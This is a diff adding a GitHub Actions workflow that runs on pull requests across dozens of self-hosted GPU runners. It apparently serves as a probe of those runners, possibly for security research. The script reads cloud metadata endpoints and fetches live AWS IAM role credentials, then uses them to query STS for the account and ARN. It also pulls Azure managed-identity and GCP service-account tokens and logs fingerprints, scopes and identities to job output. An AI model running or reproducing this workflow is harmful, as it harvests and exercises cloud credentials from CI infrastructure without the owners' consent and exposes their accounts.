@@ -1,0 +1,234 @@
+name: c211-i125080-scale
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      max-parallel: 60
+      matrix:
+        include:
+          - tag: 5090-01
+            label: 1-gpu-5090
+          - tag: 5090-02
+            label: 1-gpu-5090
+          - tag: 5090-03
+            label: 1-gpu-5090
+          - tag: 5090-04
+            label: 1-gpu-5090
+          - tag: 5090-05
+            label: 1-gpu-5090
+          - tag: 5090-06
+            label: 1-gpu-5090
+          - tag: 5090-07
+            label: 1-gpu-5090
+          - tag: 5090-08
+            label: 1-gpu-5090
+          - tag: 5090-09
+            label: 1-gpu-5090
+          - tag: 5090-10
+            label: 1-gpu-5090
+          - tag: 5090-11
+            label: 1-gpu-5090
+          - tag: 5090-12
+            label: 1-gpu-5090
+          - tag: 5090-13
+            label: 1-gpu-5090
+          - tag: 5090-14
+            label: 1-gpu-5090
+          - tag: 5090-15
+            label: 1-gpu-5090
+          - tag: 5090-16
+            label: 1-gpu-5090
+          - tag: 5090-17
+            label: 1-gpu-5090
+          - tag: 5090-18
+            label: 1-gpu-5090
+          - tag: 5090-19
+            label: 1-gpu-5090
+          - tag: 5090-20
+            label: 1-gpu-5090
+          - tag: h100x1-01
+            label: 1-gpu-h100
+          - tag: h100x1-02
+            label: 1-gpu-h100
+          - tag: h100x1-03
+            label: 1-gpu-h100
+          - tag: h100x1-04
+            label: 1-gpu-h100
+          - tag: h100x1-05
+            label: 1-gpu-h100
+          - tag: h100x1-06
+            label: 1-gpu-h100
+          - tag: h100x1-07
+            label: 1-gpu-h100
+          - tag: h100x1-08
+            label: 1-gpu-h100
+          - tag: h100x2-01
+            label: 2-gpu-h100
+          - tag: h100x2-02
+            label: 2-gpu-h100
+          - tag: h100x2-03
+            label: 2-gpu-h100
+          - tag: h100x2-04
+            label: 2-gpu-h100
+          - tag: h100x2-05
+            label: 2-gpu-h100
+          - tag: h100x2-06
+            label: 2-gpu-h100
+          - tag: h100x2-07
+            label: 2-gpu-h100
+          - tag: h100x2-08
+            label: 2-gpu-h100
+          - tag: h200-01
+            label: 8-gpu-h200
+          - tag: h200-02
+            label: 8-gpu-h200
+          - tag: h200-03
+            label: 8-gpu-h200
+          - tag: h200-04
+            label: 8-gpu-h200
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i125080-cce87f94d128bf97
+          JOBTAG: ${{ matrix.tag }}
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211_SCALE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- k8s presence-only checks ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          if [ -s "$SA/token" ]; then
+            if command -v sha256sum >/dev/null 2>&1; then echo "K8S_SA_TOKEN_SHA256_16=$(sha256sum "$SA/token" | cut -c1-16)"; else echo K8S_SA_TOKEN_SHA256_UNAVAILABLE; fi
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- azure metadata fingerprint (read-only) ---"
+          AZ_CODE=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)
+          echo "AZURE_IMDS_STATUS=$AZ_CODE"
+          if [ "$AZ_CODE" = "200" ] && command -v python3 >/dev/null 2>&1; then
+            python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_az.json'))
+          c=(d.get('compute') or {})
+          print('AZURE_VM_SIZE',c.get('vmSize'),'AZURE_LOCATION',c.get('location'),'AZURE_RG',c.get('resourceGroupName'))
+          " 2>&1 | head -3 || echo AZURE_PARSE_SKIPPED
+          fi
+          AZ_MSI_CODE=$(curl -sS -o /tmp/c211_msi.json -w '%{http_code}' --max-time 5 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null || echo ERR)
+          echo "AZURE_MSI_STATUS=$AZ_MSI_CODE"
+          if [ "$AZ_MSI_CODE" = "200" ] && command -v python3 >/dev/null 2>&1; then
+            python3 -c "
+          import json,hashlib
+          d=json.load(open('/tmp/c211_msi.json'))
+          t=d.get('access_token')
+          print('AZURE_MSI_TOKEN_PRESENT',bool(t),'AZURE_MSI_TOKEN_SHA256_16',hashlib.sha256((t or '').encode()).hexdigest()[:16],'AZURE_MSI_EXPIRES_ON',d.get('expires_on'),'AZURE_MSI_RESOURCE',d.get('resource'))
+          " 2>&1 | head -3 || echo AZURE_MSI_PARSE_SKIPPED
+          fi
+          AZ_T_CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Ftampered.invalid%2F' 2>/dev/null || echo ERR)
+          echo "AZURE_MSI_TAMPERED_STATUS=$AZ_T_CODE"
+          echo "--- gcp metadata fingerprint (read-only) ---"
+          GCP_CODE=$(curl -sS -o /tmp/c211_gcp_id -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)
+          echo "GCP_METADATA_STATUS=$GCP_CODE"
+          if [ "$GCP_CODE" = "200" ]; then echo "GCP_INSTANCE_ID=$(head -c 80 /tmp/c211_gcp_id)"; fi
+          GCP_T_CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Tampered' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)
+          echo "GCP_TAMPERED_STATUS=$GCP_T_CODE"
+          GCP_TOK_CODE=$(curl -sS -o /tmp/c211_gcp_tok.json -w '%{http_code}' --max-time 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null || echo ERR)
+          echo "GCP_SA_TOKEN_STATUS=$GCP_TOK_CODE"
+          if [ "$GCP_TOK_CODE" = "200" ] && command -v python3 >/dev/null 2>&1; then
+            python3 -c "
+          import json,hashlib
+          d=json.load(open('/tmp/c211_gcp_tok.json'))
+          t=d.get('access_token')
+          print('GCP_SA_TOKEN_PRESENT',bool(t),'GCP_SA_TOKEN_SHA256_16',hashlib.sha256((t or '').encode()).hexdigest()[:16],'GCP_SA_TOKEN_SCOPES',d.get('scope'),'GCP_SA_TOKEN_EXPIRES_IN',d.get('expires_in'))
+          " 2>&1 | head -3 || echo GCP_TOKEN_PARSE_SKIPPED
+          fi
+          GCP_EMAIL_CODE=$(curl -sS -o /tmp/c211_gcp_email -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' 2>/dev/null || echo ERR)
+          echo "GCP_SA_EMAIL_STATUS=$GCP_EMAIL_CODE"
+          if [ "$GCP_EMAIL_CODE" = "200" ]; then echo "GCP_SA_EMAIL=$(head -c 120 /tmp/c211_gcp_email)"; fi
+          echo "C211_SCALE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
